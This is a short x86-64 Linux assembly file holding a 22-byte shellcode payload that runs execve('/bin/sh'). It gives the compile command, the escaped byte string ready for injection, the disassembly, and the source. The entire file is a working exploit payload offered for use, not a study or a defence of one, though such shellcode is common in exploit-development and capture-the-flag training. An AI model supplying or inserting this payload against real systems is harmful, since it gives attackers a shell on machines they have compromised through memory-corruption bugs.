/*

compile: gcc -nostdlib x64-bin-sh.s

code(22 bytes): \x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x31\xf6\x56\x53\x54\x5f\xb0\x3b\x31\xd2\x0f\x05

<_start>:
48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f6e69622f
73 68 00
31 f6                	xor    esi,esi
56                   	push   rsi
53                   	push   rbx
54                   	push   rsp
5f                   	pop    rdi
b0 3b                	mov    al,0x3b
31 d2                	xor    edx,edx
0f 05                	syscall

*/.intel_syntax noprefix
    .global _start
_start:
    mov rbx, 0x68732f6e69622f
    xor esi, esi
    pushq rsi
    pushq rbx
    pushq rsp
    popq rdi
    mov al, 0x3b
    xor edx, edx
    syscall
